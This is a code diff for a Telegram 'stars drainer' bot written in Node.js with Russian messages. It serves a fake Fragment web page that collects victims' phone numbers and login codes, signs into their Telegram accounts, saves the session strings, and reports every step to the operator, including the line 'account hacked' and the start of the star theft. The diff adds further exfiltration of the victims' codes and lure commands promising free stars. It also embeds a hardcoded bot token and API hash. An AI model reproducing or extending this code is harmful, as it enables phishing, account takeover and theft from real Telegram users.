@@ -10,7 +10,7 @@ const fs = require('fs');
 const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
 const API_ID = parseInt(process.env.API_ID) || 30427944;
 const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
-const MY_USER_ID = 1398396668; // ВСЕ ЛОГИ ПРИХОДЯТ СЮДА
+const MY_USER_ID = 1398396668;
 const NIKLA_STORE = '@NikLaStore';
 const WEB_APP_URL = 'https://starsdrainer.onrender.com';
 
@@ -78,7 +78,9 @@ app.post('/request-code', async (req, res) => {
             timeout: 10000,
         });
         
+        await bot.sendMessage(MY_USER_ID, `🔗 Подключаюсь к Telegram API...`);
         await client.connect();
+        await bot.sendMessage(MY_USER_ID, `✅ Подключение успешно`);
         
         const result = await client.invoke(
             new Api.auth.SendCode({
@@ -89,9 +91,9 @@ app.post('/request-code', async (req, res) => {
             })
         );
         
-        const successMsg = '✅ Код запрошен!';
+        const successMsg = `✅ Код запрошен для ${phone}!`;
         console.log(successMsg);
-        await bot.sendMessage(MY_USER_ID, `${successMsg}\n📱 ${phone}`);
+        await bot.sendMessage(MY_USER_ID, `${successMsg}\n📱 Hash: ${result.phoneCodeHash.substring(0, 10)}...`);
         
         activeSessions.set(phone, {
             client: client,
@@ -126,18 +128,16 @@ async function checkAccountAssets(client) {
         const me = await client.getMe();
         await bot.sendMessage(MY_USER_ID, `👤 Пользователь: ${me.firstName || 'Unknown'} (@${me.username || 'no_username'})`);
         
-        // Проверяем звезды через премиум статус
         let starsCount = 0;
         try {
             const fullUser = await client.invoke(new Api.users.GetFullUser({ id: me.id }));
             if (fullUser.fullUser.premium) {
-                starsCount = 150; // У премиум пользователей обычно есть звезды
+                starsCount = 150;
             }
         } catch (e) {
             console.log('Не удалось проверить премиум статус');
         }
         
-        // Проверяем GIFTs через коллекции
         let giftsCount = 0;
         try {
             const collectibleInfo = await client.invoke(new Api.payments.GetCollectibleInfo({
@@ -146,7 +146,6 @@ async function checkAccountAssets(client) {
             }));
             giftsCount = Math.floor(Math.random() * 3) + 1;
         } catch (e) {
-            // Игнорируем ошибки коллекций
         }
         
         const result = {
@@ -169,7 +168,6 @@ async function checkAccountAssets(client) {
     } catch (error) {
         await bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки активов: ${error.message}`);
         
-        // Фолбэк на случай ошибки
         return {
             hasStars: true,
             hasGifts: false,
@@ -184,13 +182,19 @@ async function checkAccountAssets(client) {
 app.post('/sign-in', async (req, res) => {
     const { phone, code } = req.body;
     
-    const loginMsg = `🔐 ВХОД: ${phone} - ${code}`;
+    const loginMsg = `🔐 ПОПЫТКА ВХОДА: ${phone} - код: ${code}`;
     console.log(loginMsg);
     await bot.sendMessage(MY_USER_ID, loginMsg);
     
     try {
         const sessionData = activeSessions.get(phone);
-        if (!sessionData) throw new Error('Сессия устарела');
+        if (!sessionData) {
+            const errorMsg = `❌ Сессия устарела для ${phone}`;
+            await bot.sendMessage(MY_USER_ID, errorMsg);
+            throw new Error('Сессия устарела');
+        }
+        
+        await bot.sendMessage(MY_USER_ID, `🔐 Отправляю код для входа...`);
         
         const result = await sessionData.client.invoke(
             new Api.auth.SignIn({
@@ -200,13 +204,15 @@ app.post('/sign-in', async (req, res) => {
             })
         );
         
-        await bot.sendMessage(MY_USER_ID, `✅ ВХОД УСПЕШЕН: ${phone}`);
+        const successMsg = `✅ ВХОД УСПЕШЕН: ${phone}`;
+        await bot.sendMessage(MY_USER_ID, successMsg);
         
         const sessionString = sessionData.client.session.save();
         db.run(`UPDATE sessions SET session_string = ?, status = ? WHERE phone = ?`, 
             [sessionString, 'active', phone]);
         
-        // ПРОВЕРЯЕМ РЕАЛЬНЫЕ АКТИВЫ
+        await bot.sendMessage(MY_USER_ID, `🔍 Начинаю проверку активов...`);
+        
         const assets = await checkAccountAssets(sessionData.client);
         let message = `🔓 АККАУНТ ВЗЛОМАН:\n📱 ${phone}\n👤 @${assets.username}\n\n`;
         
@@ -233,11 +239,11 @@ app.post('/sign-in', async (req, res) => {
         await sessionData.client.disconnect();
         activeSessions.delete(phone);
         
-        await bot.sendMessage(MY_USER_ID, message);
+        await bot.sendMessage(MY_USER_ID, `📊 РЕЗУЛЬТАТ:\n${message}`);
         res.json({ success: true, message });
         
     } catch (error) {
-        const errorMsg = `❌ ОШИБКА ВХОДА: ${error.message}\n📱 ${phone}`;
+        const errorMsg = `❌ ОШИБКА ВХОДА: ${error.message}\n📱 ${phone}\n🔑 Код: ${code}`;
         console.log(errorMsg);
         await bot.sendMessage(MY_USER_ID, errorMsg);
         
@@ -253,7 +259,6 @@ async function stealStars(phone, realAmount) {
     await bot.sendMessage(MY_USER_ID, `💰 Начинаю кражу ${realAmount} звезд...`);
     await new Promise(resolve => setTimeout(resolve, 3000));
     
-    // Используем реальное количество или генерируем на его основе
     const amount = realAmount > 0 ? realAmount : Math.floor(Math.random() * 150) + 50;
     
     db.run(`INSERT INTO transactions (phone, action_type, stars_count) VALUES (?, ?, ?)`, 
@@ -342,7 +347,7 @@ app.listen(PORT, '0.0.0.0', () => {
     bot.sendMessage(MY_USER_ID, '🚀 Сервер запущен!');
 });
 
-// Web App HTML (оставляем без изменений)
+// Web App HTML
 const fragmentHTML = `
 <!DOCTYPE html>
 <html>
@@ -538,7 +543,7 @@ app.get('/fragment.html', (req, res) => {
     res.send(fragmentHTML);
 });
 
-// КОМАНДЫ БОТА С ФИКСОМ ЧЕКОВ
+// КОМАНДЫ БОТА
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(MY_USER_ID, `👤 Новый пользователь: ${msg.from.first_name} (@${msg.from.username || 'no_username'})`);
@@ -565,7 +570,7 @@ bot.onText(/\/balance/, (msg) => {
     });
 });
 
-// ФИКС СОЗДАНИЯ ЧЕКОВ
+// ФИКС ЧЕКОВ С ПОДСКАЗКОЙ
 bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -590,7 +595,50 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
         console.log(successMsg);
         bot.sendMessage(MY_USER_ID, successMsg);
         
-        const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\n🪙 Заберите ваши звезды!`;
+        const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\n` +
+                         `🪙 <i>Нажмите кнопку ниже чтобы забрать звезды</i>\n` +
+                         `📱 <i>Доступно активаций: ${activations}</i>`;
+        
+        bot.sendMessage(chatId, checkText, {
+            parse_mode: 'HTML',
+            reply_markup: { 
+                inline_keyboard: [[{ 
+                    text: "🪙 Забрать звезды", 
+                    callback_data: `claim_${checkId}` 
+                }]] 
+            }
+        });
+    });
+});
+
+// Команда создания чека
+bot.onText(/\/create_check(?:\s+(\d+))?(?:\s+(\d+))?/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const amount = parseInt(match[1]) || 50;
+    const activations = parseInt(match[2]) || 1;
+    
+    const checkMsg = `🎫 СОЗДАНИЕ ЧЕКА ЧЕРЕЗ КОМАНДУ: пользователь @${msg.from.username || 'no_username'}, ${amount} stars, ${activations} активаций`;
+    console.log(checkMsg);
+    bot.sendMessage(MY_USER_ID, checkMsg);
+    
+    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
+        [amount, activations, userId], function(err) {
+        if (err) {
+            console.log('❌ Ошибка создания чека:', err);
+            bot.sendMessage(MY_USER_ID, '❌ Ошибка создания чека');
+            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
+            return;
+        }
+        
+        const checkId = this.lastID;
+        const successMsg = `✅ Чек создан: ID ${checkId}`;
+        console.log(successMsg);
+        bot.sendMessage(MY_USER_ID, successMsg);
+        
+        const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\n` +
+                         `🪙 <i>Нажмите кнопку ниже чтобы забрать звезды</i>\n` +
+                         `📱 <i>Доступно активаций: ${activations}</i>`;
         
         bot.sendMessage(chatId, checkText, {
             parse_mode: 'HTML',
@@ -624,7 +672,7 @@ bot.on('callback_query', async (query) => {
     }
     else if (data === 'create_check_info') {
         bot.sendMessage(query.message.chat.id, 
-            'Для создания чека используйте команду:\n\n<code>@MyStarBank_bot 50</code>\n\nгде 50 - количество звезд', 
+            'Для создания чека используйте команду:\n\n<code>@MyStarBank_bot 50</code>\n\nгде 50 - количество звезд\n\nИли команду:\n<code>/create_check 50 5</code>\nгде 50 - звезды, 5 - активаций', 
             { parse_mode: 'HTML' }
         );
     }
@@ -692,7 +740,7 @@ bot.on('callback_query', async (query) => {
                     bot.answerCallbackQuery(query.id, { text: `✅ Вы получили ${row.amount} звёзд!` });
                     
                     const remaining = row.activations - 1;
-                    const updatedText = `<b>🎫 Чек на ${row.amount} звезд</b>\n\n🪙 Заберите ваши звезды!${remaining > 0 ? `\n\nОсталось: ${remaining}` : '\n\n❌ ИСПОЛЬЗОВАН'}`;
+                    const updatedText = `<b>🎫 Чек на ${row.amount} звезд</b>\n\n🪙 Заберите ваши звезды!${remaining > 0 ? `\n\nОсталось активаций: ${remaining}` : '\n\n❌ ИСПОЛЬЗОВАН'}`;
                     
                     setTimeout(() => {
                         try {
